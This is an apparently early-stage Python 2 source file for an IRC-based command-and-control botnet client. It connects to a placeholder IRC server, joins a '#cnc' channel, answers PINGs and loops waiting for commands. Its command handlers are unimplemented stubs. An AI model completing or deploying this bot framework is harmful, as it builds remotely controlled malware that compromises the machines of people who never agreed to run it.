#!/usr/bin/python
#IRC-based CNC Botnet
#Authors: Luke Matarazzo and Jackson Sadowski
#Blizzo

import socket
import ftplib
import urllib2
import urllib
import sys
import ctypes
import random
import time
import platform
import os

#IRC Settings
server = "server"
channel = "#cnc"
botnick = "cncnick"

def iAmHere(): #send back to IRC server that you are here
	print "'iAmHere' function not yet implemented"

def iAmGood(): #send back to IRC server that you are good
	print "'iAmGood' function not yet implemented"

#dictionary of functions
commands = {
	"are you there" : iAmHere,
	"how are you" : iAmGood
}

#function which parses the command and determine how to handle it
def parseCommand(command):
	#have to actually parse the text and find the command.
	print "in the parseCommand function"
	print "arg is '%s'" % command
	# print "calling appropriate function..."
	# commands[command]()
	# print "function called"




#THIS SECTION IS FOR CONNECTION TO THE SERVER
#Connecting to the IRC Server
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
print "connecting to: "+server
irc.connect((server, 6667)) #connects to the server
irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n") #user authentication
irc.send("NICK "+ botnick +"\n") #sets nick
irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
irc.send("JOIN "+ channel +"\n") #join the channel

#infinite loop to listen for messages aka commands
while 1:
	text=irc.recv(4096)  #receive up to 4096 bytes
	lines = text.split("\n") #split commands based on new lines

	#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
	if text.find('PING') != -1: #check if 'PING' is found
		irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server to prevent pinging out

	parseCommand(text) #call function to parse commands
